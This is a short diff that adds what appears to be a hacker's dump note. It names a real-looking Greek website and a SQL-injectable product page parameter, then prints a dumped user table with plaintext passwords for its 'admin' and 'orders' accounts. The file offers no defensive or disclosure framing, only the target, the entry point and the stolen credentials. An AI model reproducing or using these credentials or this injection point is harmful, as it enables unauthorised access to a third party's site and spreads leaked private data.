@@ -1,0 +1,11 @@
+web-site: http://mdavaris.gr
+vulnerabilitiy: http://www.mdavaris.gr/productview.php?id=0
+admin: coludnt find
+
+Dumped:
+-----------+----------+----+---------+---------+------------+-------+----------+
+| datein     | group_id | id | info_id | modules | password   | perms | username |
++------------+----------+----+---------+---------+------------+-------+----------+
+| 0000-00-00 | 0        | 1  | 0       |         | davaris#12 | 1     | admin    |
+| 0000-00-00 | 0        | 3  | 0       | orders  | davaris#12 | 1     | orders   |
++------------+----------+----+---------+---------+------------+-------+----------+
